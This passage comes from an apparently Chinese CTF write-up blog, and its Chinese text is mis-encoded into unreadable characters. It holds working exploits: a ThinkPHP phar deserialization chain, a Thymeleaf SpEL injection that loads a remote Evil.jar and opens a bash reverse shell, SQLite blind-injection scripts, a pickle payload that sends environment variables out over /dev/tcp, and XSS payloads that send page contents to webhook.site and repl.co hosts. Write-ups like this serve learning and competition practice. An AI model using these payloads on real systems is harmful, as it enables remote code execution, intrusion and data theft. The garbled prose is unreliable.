æ•ˆæœï¼š æœ€åä¸€ä¸ªå°é—®é¢˜å°±æ˜¯iconv.utf-16le.utf-8å¤„ç†å†…å®¹éœ€è¦å¶æ•°é•¿åº¦ã€‚è¿™ä¸ªç›´æ¥55å¼€æ¦‚ç‡å¡«å……å­—ç¬¦å°±å¥½äº†( exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445# coding: utf-8# -**- author: byc_404 -**-import requestsimport socketurl = 'http://eci-2zeexuk65iew0fq0ohe6.cloudeci1.ichunqiu.com/index.php/hello/1234'host = 'eci-2zeexuk65iew0fq0ohe6.cloudeci1.ichunqiu.com'def clear(): r = requests.get(url, params=&#123; 'file': 'php://filter/read=consumed/resource=../runtime/log/202105/29.log' &#125;) print(r.text)def write(payload): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((host, 80)) sock.send(f\"\"\"GET /index.php/hello/12345?file&#123;payload&#125; HTTP/1.1HOST: eci-2zeexuk65iew0fq0ohe6.cloudeci1.ichunqiu.comUser-Agent: curl/7.64.1\"\"\".encode()) print(sock.recv(2048))def trigger(): r = requests.get(url, params=&#123; 'file': 'php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../runtime/log/202105/29.log' &#125;) print(r.text)def exp(): r = requests.get(url, params=&#123; 'file': 'phar:///var/www/html/runtime/log/202105/29.log' &#125;) print(r.text)#php poc.php -&gt; phar.phar#cat phar.phar | base64 -w0 | sed -E 's/=+$//g' | sed -E 's/./\\0=00/g'payload = 'R=000=00l=00G=00O=00D=00l=00h=00P=00D=009=00w=00a=00H=00A=00g=00X=001=009=00I=00Q=00U=00x=00U=00X=000=00N=00P=00T=00V=00B=00J=00T=00E=00V=00S=00K=00C=00k=007=00I=00D=008=00+=00D=00Q=00p=00x=00A=00Q=00A=00A=00A=00Q=00A=00A=00A=00B=00E=00A=00A=00A=00A=00B=00A=00A=00A=00A=00A=00A=00A=007=00A=00Q=00A=00A=00T=00z=00o=00y=00N=00z=00o=00i=00d=00G=00h=00p=00b=00m=00t=00c=00c=00H=00J=00v=00Y=002=00V=00z=00c=001=00x=00w=00a=00X=00B=00l=00c=001=00x=00X=00a=00W=005=00k=00b=003=00d=00z=00I=00j=00o=00x=00O=00n=00t=00z=00O=00j=00M=000=00O=00i=00I=00A=00d=00G=00h=00p=00b=00m=00t=00c=00c=00H=00J=00v=00Y=002=00V=00z=00c=001=00x=00w=00a=00X=00B=00l=00c=001=00x=00X=00a=00W=005=00k=00b=003=00d=00z=00A=00G=00Z=00p=00b=00G=00V=00z=00I=00j=00t=00h=00O=00j=00E=006=00e=002=00k=006=00M=00D=00t=00P=00O=00j=00E=003=00O=00i=00J=000=00a=00G=00l=00u=00a=001=00x=00t=00b=002=00R=00l=00b=00F=00x=00Q=00a=00X=00Z=00v=00d=00C=00I=006=00N=00D=00p=007=00c=00z=00o=00x=00N=00z=00o=00i=00A=00H=00R=00o=00a=00W=005=00r=00X=00E=001=00v=00Z=00G=00V=00s=00A=00G=00R=00h=00d=00G=00E=00i=00O=002=00E=006=00M=00T=00p=007=00c=00z=00o=002=00O=00i=00I=000=00d=00X=00Q=00x=00N=00W=000=00i=00O=003=00M=006=00O=00T=00o=00i=00d=00G=00F=00j=00I=00C=009=00m=00b=00G=00F=00n=00I=00j=00t=009=00c=00z=00o=00y=00M=00T=00o=00i=00A=00H=00R=00o=00a=00W=005=00r=00X=00E=001=00v=00Z=00G=00V=00s=00A=00H=00d=00p=00d=00G=00h=00B=00d=00H=00R=00y=00I=00j=00t=00h=00O=00j=00E=006=00e=003=00M=006=00N=00j=00o=00i=00N=00H=00V=000=00M=00T=00V=00t=00I=00j=00t=00z=00O=00j=00Y=006=00I=00n=00N=005=00c=003=00R=00l=00b=00S=00I=007=00f=00X=00M=006=00O=00T=00o=00i=00A=00C=00o=00A=00Y=00X=00B=00w=00Z=00W=005=00k=00I=00j=00t=00h=00O=00j=00E=006=00e=003=00M=006=00N=00j=00o=00i=00N=00H=00V=000=00M=00T=00V=00t=00I=00j=00t=00h=00O=00j=00A=006=00e=003=001=009=00c=00z=00o=004=00O=00i=00J=00y=00Z=00W=00x=00h=00d=00G=00l=00v=00b=00i=00I=007=00Y=00T=00o=00x=00O=00n=00t=00p=00O=00j=00A=007=00c=00z=00o=00x=00O=00i=00I=00x=00I=00j=00t=009=00f=00X=001=009=00C=00A=00A=00A=00A=00H=00R=00l=00c=003=00Q=00u=00d=00H=00h=000=00B=00A=00A=00A=00A=00B=003=00y=00s=00W=00A=00E=00A=00A=00A=00A=00D=00H=005=00/=002=00K=00Q=00B=00A=00A=00A=00A=00A=00A=00A=00A=00d=00G=00V=00z=00d=00N=00i=007=00R=00e=00v=00K=00D=00K=002=00M=00E=008=00F=00h=00E=00e=00j=001=00T=00a=00S=00L=00Q=00p=00+=00L=00A=00g=00A=00A=00A=00E=00d=00C=00T=00U=00I=00'clear()write(payload)trigger()exp() ç”Ÿæˆtp5.1ååºåˆ—åŒ–åˆ©ç”¨pharçš„poc.php 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpnamespace think;abstract class Model&#123; private $data = []; private $withAttr = []; protected $append = ['byc_404'=&gt;[]]; public function __construct($cmd)&#123; $this-&gt;relation = [\"1\"]; $this-&gt;data = ['byc_404'=&gt; $cmd]; $this-&gt;withAttr = ['byc_404'=&gt;'system']; &#125;&#125;namespace think\\model;use think\\Model;class Pivot extends Model&#123;&#125;namespace think\\process\\pipes;use think\\model\\Pivot;class Windows&#123; private $files = []; public function __construct($cmd)&#123; $this-&gt;files = [new Pivot($cmd)]; &#125;&#125;$windows = new Windows(\"tac /flag\");echo base64_encode(serialize($windows)).\"\\n\";@unlink('phar.phar');$p = new \\Phar('phar.phar', 0);$p-&gt;startBuffering();$p-&gt;setStub('GIF89a'.'&lt;?php __HALT_COMPILER(); ?&gt;');$p-&gt;setMetadata($windows);$p-&gt;addFromString('test.txt','test');$p-&gt;stopBuffering();?&gt; Do_You_Know_Meç¯å¢ƒçœŸçš„å¤ªå¡äº†ã€‚ã€‚ã€‚è€Œä¸”åŸºæœ¬è¿‡äº†10å¤šåˆ†é’Ÿåæ¯æ¬¡è¯·æ±‚å°±ç¨³å®šè¶…æ—¶ã€‚æ²¡æœ‰æºç é»‘ç›’æ‰“å¯¼è‡´è‡³å°‘æ‹–æ²“äº†å‡ å°æ—¶ã€‚ä¸ç„¶è‚¯å®šæ¯”èµ›é‡Œèƒ½å‡ºã€‚ æ¼æ´å°±æ˜¯ä¸ªthymeleaf çš„ssti,æˆ–è€…è¯´å°±æ˜¯SpEL.å› ä¸ºæ˜¯springbootçš„ç¯å¢ƒï¼Œæ‰€ä»¥è¿˜æ˜¯å¾ˆå¥½æƒ³åˆ°thymeleafçš„ã€‚å…³é”®è¿˜æ˜¯æ€ä¹ˆç»•waf. è¿™é‡Œæµ‹äº†ä¸‹ï¼Œä¼°è®¡wafæœ‰java.lang.*,forName,newInstance,new,toString,runtimexx ç­‰ç­‰ã€‚ä½†æ˜¯URLclassloaderè¿˜åœ¨ã€‚æ‰€ä»¥å¯ä»¥è¿œç¨‹åŠ è½½ç±» è¿™é‡Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨SpELçš„ç‰¹æ€§ï¼Œå…³é”®å­—ä¸åŒºåˆ†å¤§å°å†™ï¼Œæ­£å¸¸åˆ›å»ºå¯¹è±¡ã€‚ New java.net.URLClassLoader(New java.net.URL[]{New java.net.URL(&quot;http://xxxx/xxx.jar&quot;}) ç´§æ¥ç€å°±é‡åˆ°ç¬¬äºŒä¸ªé—®é¢˜ã€‚æ— æ³•ä½¿ç”¨å­—ç¬¦ä¸²ã€‚è¿™é‡Œå¸¸è§„æ‰‹æ®µT(java.lang.Character)æ˜¯ä¸è¡Œäº†.äºæ˜¯æˆ‘å»ç¿»äº†ä¸‹thymeleafçš„æ–‡æ¡£ã€‚å‘ç°æœ‰å¾ˆå¤šéå¸¸å¥½ç”¨çš„å†…ç½®variable https://www.thymeleaf.org/doc/tutorials/2.1/usingthymeleaf.html#appendix-a-expression-basic-objects å½“ç„¶,è¿™äº›web contextæœ‰ä¸€åŠä¹Ÿè¢«banæ‰äº†ã€‚ä½†æ˜¯çœ‹åˆ°ä¸‹é¢çš„httpServletRequestçš„æ–¹æ³•getParameter,åº”è¯¥èƒ½å¤Ÿè¯»å–httpè¯·æ±‚çš„å‚æ•°ã€‚è¿™æ ·æˆ‘ä»¬å°±èƒ½ä¼ å…¥å­—ç¬¦ä¸²äº†ã€‚ ç„¶åé‡åˆ°ç¬¬ä¸‰ä¸ªé—®é¢˜ã€‚åŸæœ¬æˆ‘æ‰“ç®—è¿œç¨‹åŠ è½½æ¶æ„ç±»,å®ä¾‹åŒ–ç„¶åç›´æ¥å‘½ä»¤æ‰§è¡Œã€‚ç„¶è€ŒnewInstanceè¢«banäº†ã€‚ã€‚ã€‚ä½†æ˜¯æ¯•ç«Ÿæˆ‘ä»¬ç°åœ¨å¯ä»¥åšåˆ°åŠ è½½ç±»,é‚£ä¹ˆåå°„è°ƒç”¨ä»»æ„æ–¹æ³•æ¥æ‰§è¡Œå‘½ä»¤åº”è¯¥æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ã€‚çœ‹äº†ä¸‹getDeclaredMethodè·Ÿinvokeéƒ½åœ¨ï¼Œè§£å†³æ–¹æ³•å°±æ°´è½çŸ³å‡ºäº†ã€‚ åˆ›å»ºæ¶æ„ç±»ã€‚æˆ‘ä»¬æŠŠå‘½ä»¤æ‰§è¡Œä»£ç å†™å…¥å…¶é™æ€rceæ–¹æ³•ã€‚ 123456789101112import java.io.*;public class Evil &#123; public static void rce() &#123; try &#123; String commands[] = &#123;\"bash\", \"-c\", \"bash -i &gt;&amp; /dev/tcp/xxx/9001 0&gt;&amp;1\"&#125;; Runtime.getRuntime().exec(commands); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; ç¼–è¯‘ç”ŸæˆEvil.jar 12javac Evil.javajar cvf Evil.jar Evil.class vpsä¸Šç›‘å¬ï¼Œç„¶åæ‰“ä¸€å‘ New java.net.URLClassLoader(New java.net.URL[]{New java.net.URL(&quot;http://xxxx/xxx.jar&quot;}).getDeclaredMethod(&quot;rce&quot;).invoke(null) 123456789101112131415# coding: utf-8# -**- author: byc_404 -**-import requestsurl = 'http://eci-2zecj5hgsz4r0xz16uc6.cloudeci1.ichunqiu.com:8888/'def poc(): r = requests.post(url + 'search?0=Evil&amp;1=http://120.27.246.202/Evil.jar&amp;2=rce', data=&#123; 'name': '[[$&#123; New java.net.URLClassLoader(New java.net.URL[]&#123;New java.net.URL(#httpServletRequest.getParameter(1))&#125;).loadClass(#httpServletRequest.getParameter(0)).getDeclaredMethod(#httpServletRequest.getParameter(2)).invoke(null) &#125;]] ' &#125;) print(r.text)poc() åå¼¹shellæˆåŠŸã€‚ç„¶åå‘ç°readflagéœ€è¦rootæƒé™ã€‚çœ‹äº†ä¸‹æ²¡æœ‰å…¶ä»–å¯æ§rootæœåŠ¡ã€‚æ‰€ä»¥find / -user root -perm -4000æ‰¾ä¸‹suid,å‘ç°äº†python2.7æ˜¯æœ‰suidä½çš„ã€‚ç›´æ¥ææƒreadflagå³å¯ Summary æ€»çš„è¯´é¢˜ç›®è´¨é‡è¿˜å¯ä»¥ã€‚ä½†æ˜¯ç¯å¢ƒå¾ˆè¿·,æŸç§è§’åº¦ä¸Šæ¥è¯´é¡ºä¾¿å¸®æˆ‘å·©å›ºäº†æ³¢java(","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"},{"name":"Java","slug":"Java","permalink":"https://www.bycsec.top/tags/Java/"}]},{"title":"angstromCTF 2021","slug":"angstromCTF-2021","date":"2021-04-04T12:41:34.000Z","updated":"2021-04-08T13:01:17.855Z","comments":true,"path":"2021/04/04/angstromCTF-2021/","link":"","permalink":"https://www.bycsec.top/2021/04/04/angstromCTF-2021/","excerpt":"æ”¾å‡æ—¶åšäº†ä¸‹ angstromCTFçš„é¢˜ç›®, è´¨é‡éƒ½æŒºä¸é”™çš„ã€‚è¿™é‡Œè®°å½•ä¸‹è‡ªå·±åšå‡ºæ¥çš„é¢˜ç›®ä»¥åŠå¤ç°çš„ã€‚","text":"æ”¾å‡æ—¶åšäº†ä¸‹ angstromCTFçš„é¢˜ç›®, è´¨é‡éƒ½æŒºä¸é”™çš„ã€‚è¿™é‡Œè®°å½•ä¸‹è‡ªå·±åšå‡ºæ¥çš„é¢˜ç›®ä»¥åŠå¤ç°çš„ã€‚ (åè§‚æŸå›½å†…æ¯”èµ›æ™ºéšœè„‘æ´é¢˜, çœŸçš„æ— è¯­ Sea of Quills é¢˜ç›®ç»™äº†ruby æºç ã€‚ æœ‰å¾ˆæ˜æ˜¾çš„æ³¨å…¥ã€‚ 1234567891011121314blacklist = [\"-\", \"/\", \";\", \"'\", \"\\\"\"]blacklist.each &#123; |word| if cols.include? word return \"beep boop sqli detected!\" end&#125;if !/^[0-9]+$/.match?(lim) || !/^[0-9]+$/.match?(off) return \"bad, no quills for you!\"end@row = db.execute(\"select %s from quills limit %s offset %s\" % [cols, lim, off]) åŸºæœ¬æ²¡waf. ç›´æ¥å­æŸ¥è¯¢æŸ¥è¡¨å,å†ä»flagtableæŸ¥flagå³å¯col=(select flag from flagtable) Sea of Quills2ç¬¬äºŒç‰ˆå°±å¾ˆæœ‰æ„æ€äº†ã€‚åŠ ä¸Šäº†çœ‹ä¼¼éå¸¸ä¸¥æ ¼çš„waf. colé•¿åº¦ä¸èƒ½è¶…è¿‡24.limit ä¸offsetéœ€è¦ä¸ºæ•°å­—ã€‚ 1234567891011121314blacklist = [\"-\", \"/\", \";\", \"'\", \"\\\"\", \"flag\"]blacklist.each &#123; |word| if cols.include? word return \"beep boop sqli detected!\" end&#125;if cols.length &gt; 24 || !/^[0-9]+$/.match?(lim) || !/^[0-9]+$/.match?(off) return \"bad, no quills for you!\"end@row = db.execute(\"select %s from quills limit %s offset %s\" % [cols, lim, off]) è¦çŸ¥é“select*fromsqlite_masteræ‰24å­—æ¯ã€‚å°±æ˜¯è¯´å­æŸ¥è¯¢è‚¯å®šä¸å¯è¡Œã€‚é‚£ä¹ˆè¦å¦‚ä½•æ³¨å…¥å‘¢? è¿™æ—¶æˆ‘æƒ³èµ·å»å¹´åšè¿‡çš„zer0pts2020 é‡Œçš„urlapp, ä¸€é“åˆ©ç”¨urlæ‰“redis æ”¹é”®åè¯»é”®åçš„é¢˜ç›®ã€‚é‚£é“é¢˜çš„æœ‰è¶£ä¹‹å¤„åœ¨äºä½¿ç”¨BITOPè¿›è¡ŒæŒ‰ä½æ”¹, ç„¶è€Œæ¼æ´æ ¹æºå´æ˜¯ï¼Œrubyæ­£åˆ™çš„è„†å¼±æ€§å¯¼è‡´äº†å¯ä»¥ä¼ å…¥\\nbypass æ­£åˆ™, ä»è€ŒSSRF æ‰“ redis. æ‰€ä»¥æ­¤å¤„å”¯ä¸€å¯èƒ½ç»•è¿‡çš„åœ°æ–¹è‡ªç„¶æ˜¯limit ä¸offset. å½“æˆ‘fuzz limit ä¼ å…¥\\næ—¶,å‘ç°æ­£åˆ™ç¡®å®è¢«ç»•è¿‡äº†ã€‚è€Œä¸”é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜èƒ½åœ¨\\nåä¼ å…¥ä»»æ„å­—ç¬¦è€Œä¸è¢«wafåŒ¹é…åˆ°ã€‚(ä¹‹åäº†è§£åˆ°rubyæ­£åˆ™åªåŒ¹é…å•è¡Œ) æ‰€ä»¥å°±æ˜¯ç›²æ³¨çš„äº‹äº†ã€‚æˆ‘ç”¨æ¯”è¾ƒåçˆ±çš„æŠ¥é”™åŒºåˆ†çŠ¶æ€ç æ¥æ³¨å…¥ 1234567891011121314151617181920import requestsimport stringurl = 'https://seaofquills-two.2021.chall.actf.co/'res = ''for j in range(1,100): print(j) for i in string.printable: r = requests.post(url + 'quills', data=&#123; 'cols': \"(select 1)\", 'limit': \"2\\n or abs(case when(substr((select flag from flagtable limit 1),\"+ str(j) +\",1)='\" + i + \"') then -9223372036854775808 else 0 end);\", \"offset\": \"3\" &#125;) if r.status_code == 500: res += i print(res) break åæ¥æƒ³èµ·æ¥ç›´æ¥union selectå°±è¡Œäº† .. 123cols: &quot;* FROM(select name,desc&quot;limit: &quot;1&quot;offset: &quot;1\\n) UNION SELECT flag, 1 FROM flagtable&quot; (æ‰€ä»¥è¿™é¢˜zer0pts æ‹¿ä¸€è¡€å¾ˆåˆç† 2333 Jarpickle ååºåˆ—åŒ–ã€‚ 1234567891011121314import picklefrom base64 import b64encode as b64class exp(object): def __reduce__(self): cmd = ['bash', '-c', 'echo $(env) &gt; /dev/tcp/xxx/9001 '] return __import__('subprocess').check_output, (cmd,)e = exp()s = pickle.dumps(e)payload = b64(s).decode()url = 'https://jar.2021.chall.actf.co/add'r = requests.post(url, cookies=&#123;'contents': payload&#125;)print(r.text) nomnomnomé¢˜ç›®ç»™äº†æºç (ä¸è¿‡ï¼Œè²Œä¼¼ä¸ç»™æºç ä¹Ÿèƒ½åš)ã€‚å¯ä»¥é”å®šå…³é”®ä»£ç å‘ç°è¿™æ˜¯ä¸€é“xssé¢˜ç›® 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354app.get('/shares/:shareName', function(req, res) &#123; // TODO: better page maybe...? would attract those sweet sweet vcbucks if (!(req.params.shareName in shares)) &#123; return res.status(400).send('hey that share doesn\\'t exist... are you a time traveller :O'); &#125; const share = shares[req.params.shareName]; const score = share.score; const name = share.name; const nonce = crypto.randomBytes(16).toString('hex'); let extra = ''; if (req.cookies.no_this_is_not_the_challenge_go_away === nothisisntthechallenge) &#123; extra = `deletion token: &lt;code&gt;$&#123;process.env.FLAG&#125;&lt;/code&gt;` &#125; return res.send(`&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta http-equiv='Content-Security-Policy' content=\"script-src 'nonce-$&#123;nonce&#125;'\"&gt; &lt;title&gt;snek nomnomnom&lt;/title&gt; &lt;/head&gt; &lt;body&gt; $&#123;extra&#125;$&#123;extra ? '&lt;br /&gt;&lt;br /&gt;' : ''&#125; &lt;h2&gt;snek goes &lt;em&gt;nomnomnom&lt;/em&gt;&lt;/h2&gt;&lt;br /&gt; Check out this score of $&#123;score&#125;! &lt;br /&gt; &lt;a href='/'&gt;Play!&lt;/a&gt; &lt;button id='reporter'&gt;Report.&lt;/button&gt; &lt;br /&gt; &lt;br /&gt; This score was set by $&#123;name&#125; &lt;script nonce='$&#123;nonce&#125;'&gt;function report() &#123; fetch('/report/$&#123;req.params.shareName&#125;', &#123; method: 'POST' &#125;);&#125;document.getElementById('reporter').onclick = () =&gt; &#123; report() &#125;; &lt;/script&gt; &lt;/body&gt;&lt;/html&gt;`);&#125;);app.post('/report/:shareName', async function(req, res) &#123; if (!(req.params.shareName in shares)) &#123; return res.status(400).send('hey that share doesn\\'t exist... are you a time traveller :O'); &#125; await visiter.visit( nothisisntthechallenge, `http://localhost:9999/shares/$&#123;req.params.shareName&#125;` );&#125;) åŒæ—¶æ³¨æ„åˆ°bot ç”¨åˆ°çš„æ˜¯firefox çš„ puppeteer 12345678910111213141516async function visit(secret, url) &#123; const browser = await puppeteer.launch(&#123; args: ['--no-sandbox'], product: 'firefox' &#125;) var page = await browser.newPage() await page.setCookie(&#123; name: 'no_this_is_not_the_challenge_go_away', value: secret, domain: 'localhost', samesite: 'strict' &#125;) await page.goto(url) // idk, race conditions!!! :D await new Promise(resolve =&gt; setTimeout(resolve, 500)); await page.close() await browser.close()&#125; ç®€è€Œè¨€ä¹‹ã€‚æˆ‘ä»¬ç°åœ¨å¯æ§sharesé¡µé¢ä¸‹ç›´æ¥æ‹¼æ¥çš„scoreä¸name.ä½†æ˜¯é¡µé¢å­˜åœ¨CSP çš„nonce ä¸”nonceä¸ºåŠ¨æ€åˆ·æ–°. æˆ‘ä»¬å¯æ§ç‚¹åœ¨å«nounceçš„script æ­£ä¸Šæ–¹ã€‚ é¦–å…ˆå¯¹äºè¿™ä¸ªCSP, å…¶å®æ˜¯éå¸¸å¥‡æ€ªçš„ã€‚ä¸€èˆ¬æ¥è¯´è®¾ç½®script-nonce å¯èƒ½ä¼šå…ˆåŠ ä¸Šscript-src: &#39;self&#39; default-src: &#39;self&#39; base-uri: none ä¹‹ç±»çš„ã€‚å…¶ä¸­ä¸€ç§ç»•è¿‡æ–¹æ³•æ˜¯åœ¨æ²¡æœ‰base-uriçš„æƒ…å†µä¸‹å…ˆæ’å…¥baseæ ‡ç­¾å†æ’å…¥scipt(å¸¦nonce),è¾¾æˆxss; ä½†æ˜¯è¿™äº›è¦æ±‚nonceå¯æ§ï¼Œæ­¤å¤„è‡ªç„¶æ˜¯ä¸è¡Œçš„ã€‚ ä½†æ˜¯,æ³¨æ„åˆ°æˆ‘ä»¬å¯æ§çš„nameå°±åœ¨scriptæ ‡ç­¾æ­£ä¸Šæ–¹ï¼Œä¸€ä¸ªæœ´ç´ çš„æƒ³æ³•è‡ªç„¶æ˜¯ï¼Œæƒ³åŠæ³•è®©æˆ‘ä»¬çš„æ ‡ç­¾æŠŠä¸‹é¢çš„åæ‰ï¼Œå¹¶ä¸”nonce æ­£å¥½å¸¦è¿›å»å°±è¡Œäº†ã€‚&lt;script src=&#39;data:text/plain,alert(1)&#39; a=å½“ç„¶èƒ½åè¿›å»ï¼Œæ­¤æ—¶åœ¨firefoxä¸‹å°±å·²ç»èƒ½xssäº†.ä½†æ˜¯chromeä¸‹å¯ä»¥ä¹ˆï¼Ÿä¸ºäº†é¿å…&lt;å­—ç¬¦çš„å½±å“,è¿™é‡Œæˆ‘å°è¯•äº†ä¸‹è®¾ç½®åŒåå±æ€§ï¼Œå› ä¸ºæµè§ˆå™¨ä¼šå¿½ç•¥ç¬¬äºŒä¸ªåŒåå±æ€§ã€‚ç»“æœå‘ç°chromeä¸‹ç¡®å®è§¦å‘ä¸äº†,å°½ç®¡å·²ç»è§£ææˆæ­£ç¡®çš„ä»£ç äº† åŸºäºé¢˜ç›®æ˜¯firefox,ç›´æ¥xssä¼ htmlä»£ç å°±è¡Œã€‚ 123456789def xss(): r = requests.post(url + 'record', json=&#123; 'name': \"\"\"&lt;script src=\"data:text/plain,location.href='https://webhook.site/48cbda29-080e-442f-8040-7a52a9093234/?s'+btoa(document.body.innerHTML)\" a=123 a=\"\"\", \"score\": 44 &#125;) print(r.text)def submit(): r = requests.post(url + 'report/376d2d58a518de7b') print(r.text) Reaction . pyè¿™é¢˜åƒäº†ä¸ªæ²¡åŸŸåçš„äºã€‚ ä¸ç„¶å¾ˆå¿«å°±èƒ½å‡ºã€‚ã€‚ã€‚ğŸ˜¦ æœ¬é¢˜åŒæ ·æ˜¯xss.å…³é”®ä»£ç åœ¨äº 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051def add_component(name, cfg, bucket): if not name or not cfg: return (ERR, \"Missing parameters\") if len(bucket) &gt;= 2: return (ERR, \"Bucket too large (our servers aren't very good :((((()\") if len(cfg) &gt; 250: return (ERR, \"Config too large (our servers aren't very good :((((()\") if name == \"welcome\": if len(bucket) &gt; 0: return (ERR, \"Welcomes can only go at the start\") bucket.append( \"\"\" &lt;form action=\"/newcomp\" method=\"POST\"&gt; &lt;input type=\"text\" name=\"name\" placeholder=\"component name\"&gt; &lt;input type=\"text\" name=\"cfg\" placeholder=\"component config\"&gt; &lt;input type=\"submit\" value=\"create component\"&gt; &lt;/form&gt; &lt;form action=\"/reset\" method=\"POST\"&gt; &lt;p&gt;warning: resetting components gets rid of this form for some reason&lt;/p&gt; &lt;input type=\"submit\" value=\"reset components\"&gt; &lt;/form&gt; &lt;form action=\"/contest\" method=\"POST\"&gt; &lt;div class=\"g-recaptcha\" data-sitekey=\"&#123;&#125;\"&gt;&lt;/div&gt; &lt;input type=\"submit\" value=\"submit site to contest\"&gt; &lt;/form&gt; &lt;p&gt;Welcome &lt;strong&gt;&#123;&#125;&lt;/strong&gt;!&lt;/p&gt; \"\"\".format( captcha.get(\"sitekey\"), escape(cfg) ).strip() ) elif name == \"char_count\": bucket.append( \"&lt;p&gt;&#123;&#125;&lt;/p&gt;\".format( escape( f\"&lt;strong&gt;&#123;len(cfg)&#125;&lt;/strong&gt; characters and &lt;strong&gt;&#123;len(cfg.split())&#125;&lt;/strong&gt; words\" ) ) ) elif name == \"text\": bucket.append(\"&lt;p&gt;&#123;&#125;&lt;/p&gt;\".format(escape(cfg))) elif name == \"freq\": counts = Counter(cfg) (char, freq) = max(counts.items(), key=lambda x: x[1]) bucket.append( \"&lt;p&gt;All letters: &#123;&#125;&lt;br&gt;Most frequent: '&#123;&#125;'x&#123;&#125;&lt;/p&gt;\".format( \"\".join(counts), char, freq ) ) else: return (ERR, \"Invalid component name\") return (OK, bucket) name æœ‰å››ç§æ–¹å¼,éƒ½ä¼šæŠŠéƒ¨åˆ†htmlå¡å…¥bucketã€‚æˆ‘ä»¬è®¿é—®é¡µé¢æ—¶bucketä¼šä½œä¸ºhtmlä»£ç è¿”å›ã€‚ç›®æ ‡æ˜¯xssæ‹¿åˆ°adminçš„bucketå†…å®¹ æ³¨æ„åˆ°ï¼Œå››ç§æ–¹å¼é‡Œåªæœ‰ä¸€ç§freqæ˜¯å¡å…¥çš„æ²¡æœ‰ç»è¿‡escapeçš„ä»£ç ã€‚ä¹Ÿå°±æ˜¯è¯´æƒ³åšåˆ°xss,å°±è¦å¡å…¥&lt;,ä¹Ÿå°±åªèƒ½é€‰è¿™æ¡è·¯äº†ã€‚ ä½†æ˜¯å…¶è¦æ±‚å¾ˆä¸¥è‹›ã€‚ä»–å›æ˜¾çš„æ˜¯&quot;&quot;.join(counts) =&gt; &quot;&quot;.join(Counter(cfg))ã€‚å°±æ˜¯è¯´æˆ‘ä»¬payloadä¸­é‡å¤çš„éƒ¨åˆ†ä¼šè¢«å»æ‰ã€‚æˆ‘ä»¬è¦å°è¯•æ²¡æœ‰é‡å¤å­—ç¬¦çš„xss. è¿‘ä¼¼è§£å†³çš„æƒ³æ³•è‡ªç„¶æ˜¯&lt;script src=http://xxx/&gt;ã€‚ä½†åƒåŸŸåæˆ–è€…å…¶ä»–ä½ç½®ä»ç„¶æœ‰é‡å¤å­—ç¬¦ã€‚ è¿™é‡Œæˆ‘å¾ˆå¿«æƒ³åˆ°ä¸€ä¸ªå¾ˆè‘—åçš„é—®é¢˜ http://www.unicode.org/reports/tr46/ã€‚ä¹Ÿå°±æ˜¯ä¸åŒå­—ç¬¦é€ æˆç›¸åŒdomainè§£æçš„é—®é¢˜(ä¸ºäº†ç…§é¡¾ä¸åŒè¯­ç§ç”¨æˆ·)ã€‚ åŒæ—¶,htmlæ ‡ç­¾æ”¯æŒå¤§å°å†™ã€‚é‚£ä¹ˆæƒ³è¦ä¸é‡å¤å­—ç¬¦å¤§æ¦‚åªæœ‰ä¸€ç§æ–¹å¼äº†&lt;SCRIPT src=//YOUR_DOMAIN&gt;æ³¨æ„//è¿™ç§åŠ è½½æ–¹å¼ã€‚å¦‚æœè·‘åœ¨webæœåŠ¡å™¨ä¸Šï¼Œhttpså°±ä¼šè‡ªåŠ¨æ‰¾https://YOUR_DOMAIN,httpå°±ä¼šè‡ªåŠ¨æ‰¾http://YOUR_DOMAINã€‚ ä¸è¿‡æˆ‘ä»¬æ²¡æ³•ä¼ å…¥ä¿©ä¸ª/ã€‚å½“ç„¶,å°è¯•hTtp:/xxxç¼©å‡ä¸€ä¸ª/ä¹Ÿæ˜¯å¯ä»¥çš„,å¯æƒœè¿™æ ·tå­—ç¬¦åˆä¼šé‡å¤ã€‚ç®€å•æµ‹è¯•äº†ä¸‹ï¼Œå‘ç°\\å¯ä»¥æ›¿ä»£/(unicode /å­—ç¬¦ä¸èƒ½æ›¿ä»£)ã€‚æ‰€ä»¥æœ€åè½¬ä¸‹domainä¸ºunicodeå°±å¯ä»¥äº†ã€‚(æˆ–è€…ä¹Ÿè®¸æœ‰dalao æœ‰ä¸è·Ÿå‰é¢å­—ç¬¦é‡å¤çš„çŸ­åŸŸåï¼Ÿ)è¿™é‡Œæˆ‘å› ä¸ºæ²¡å¼€https,æ²¡æœ‰åšå®¢ä»¥å¤–çš„åŸŸåï¼Œåªå¥½å» repl.it å¼€äº†ä¸ªä¸´æ—¶node 2333 domainçš„è½¬æ¢å¯ä»¥ä½¿ç”¨ https://splitline.github.io/domain-obfuscator/ ä¹‹å‰åœ¨bamboofox CTFä¸­ç”¨è¿‡ 123456789def add(): r = requests.post(url + 'newcomp', data=&#123; 'name': \"freq\", 'cfg': \"&lt;SCRIPT src=\\/â…¹ï¼â„¬â“â“’ãŠµ4ã€‚áµ£â‚‘â‚šâ„“ï½¡â„­Âº&gt;\" &#125;, cookies=&#123; 'session': \"eyJ1c2VybmFtZSI6ImJ5YzQwNiJ9.YGkXgQ.QZ2FZ8USqQHWcjStB4p6tTfbsUo\" &#125;) print(r.text)add() repl.itä¸Šæ”¾çš„æ˜¯ 1fetch('/?fakeuser=admin').then(r =&gt; r.text()).then(r =&gt; fetch(`https://x.byc404.repl.co/?flag=$&#123;btoa(r)&#125;`,&#123;'mode':'no-cors'&#125;)) ps: å…¶å®è¿™ä¸ªunicodeçš„é—®é¢˜åœ¨nodejs 8åŠä»¥å‰å¾—ç‰ˆæœ¬è¡¨ç°å¾—æ¯”è¾ƒä¸¥é‡ã€‚å› 